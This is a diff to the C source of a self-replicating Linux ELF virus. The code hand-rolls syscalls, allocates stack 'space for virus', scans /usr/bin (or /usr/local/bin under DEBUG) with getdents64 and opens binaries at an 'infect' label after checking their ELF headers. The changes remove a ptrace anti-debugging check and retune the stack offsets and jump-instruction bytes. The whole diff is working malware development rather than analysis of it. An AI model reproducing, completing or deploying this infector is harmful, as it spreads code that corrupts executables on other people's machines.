@@ -12,7 +12,6 @@
 #define SYS_CLOSE	3
 #define SYS_LSEEK	8
 #define SYS_EXIT	60
-#define SYS_PTRACE	101
 #define SYS_GETUID	102
 #define SYS_GETDENTS64	217
 #define SYS_OPENAT	257
@@ -25,7 +24,6 @@
 #define open(filename, flags, mode) 		syscall3(SYS_OPEN, (long)(filename), (long)flags, (long)mode)
 #define openat(dfd, filename, flags, mode) 	syscall4(SYS_OPENAT, (long)dfd, (long)(filename), (long)flags, (long)mode)
 #define close(fd)				syscall1(SYS_CLOSE, fd)
-#define ptrace(request, pid, addr, data) 	syscall4(SYS_PTRACE, (long)(request), (long)(pid), (long)(addr), (long)(data))
 #define getdents64(dfd, dirent, count) 		syscall3(SYS_GETDENTS64, (long)(dfd), (long)(dirent), (long)count)
 #define getuid() 				syscall1(SYS_GETUID, 0)
 
@@ -100,9 +98,6 @@ typedef struct
 
 /* ELF format end */
 
-/* ptrace */
-#define PTRACE_ME	0
-
 /* Dirent - struct from linux kernel source */
 #define O_DIRECTORY  0200000
  struct linux_dirent64 {
@@ -169,7 +164,7 @@ void _start(void)
 {
 	__asm__ __volatile__ (
 		/* handle stack manually.... yes this is fight agains compiler :( */
-		"add $0x83c8, %rsp\n"
+		"add $0x8388, %rsp\n"
 		/* This is needed because if I don't do it,
 		 * then I will crash to glibc pointer protection.
 		 */
@@ -182,7 +177,7 @@ void _start(void)
 		"pushq %rbp\n"
 
 		/* allocate spack space for virus */
-		"sub $0x83c8, %rsp\n"
+		"sub $0x8388, %rsp\n"
 	);
 
 	volatile Elf64_Ehdr ehdr;
@@ -202,11 +197,6 @@ void _start(void)
 	unsigned long skip;
 	volatile char *file_name;
 
-	/* Primitive anti-debugging technique */
-	if (ptrace(PTRACE_ME, 0, 0, 0) == -1) {
-		goto label2;
-	}
-
 	/* Just one by one.. because this will be
 	 * translated to mov instructions inside .text
 	 * section.
@@ -217,7 +207,7 @@ void _start(void)
 	jmp[0] = '\x48'; 
 	jmp[1] = '\x81';
 	jmp[2] = '\xc4';
-	jmp[3] = '\xc8';
+	jmp[3] = '\x88';
 	jmp[4] = '\x83';
 	jmp[5] = '\x00';
 	jmp[6] = '\x00';
@@ -266,10 +256,24 @@ void _start(void)
 		buf[2] = 's';
 		buf[3] = 'r';
 		buf[4] = '/';
-		buf[5] = 'b';
-		buf[6] = 'i';
-		buf[7] = 'n';
-		buf[8] = '\0';
+#ifdef DEBUG
+		buf[5] = 'l';
+		buf[6] = 'o';
+		buf[7] = 'c';
+		buf[8] = 'a';
+		buf[9] = 'l';
+		buf[10] = '/';
+		buf[11] = 'b';
+		buf[12] = 'i';
+		buf[13] = 'n';
+		buf[14] = '\0';
+#else
+		buf[5] = '/';
+		buf[6] = 'b';
+		buf[7] = 'i';
+		buf[8] = 'n';
+		buf[9] = '\0';
+#endif
 
 		dfd = openat(AT_FDCWD, buf, O_RDONLY | O_DIRECTORY, 0);
 		if (dfd == -1) {
@@ -302,7 +306,7 @@ infect:
 	if (fd < 0) {
 		goto label2;
 	}
-	volatile long n = read(fd, &ehdr, sizeof(ehdr));
+	read(fd, &ehdr, sizeof(ehdr));
 	if (ehdr.e_ident[0] != 0x7f
 	    || ehdr.e_ident[1] != 'E'
 	    || ehdr.e_ident[2] != 'L'
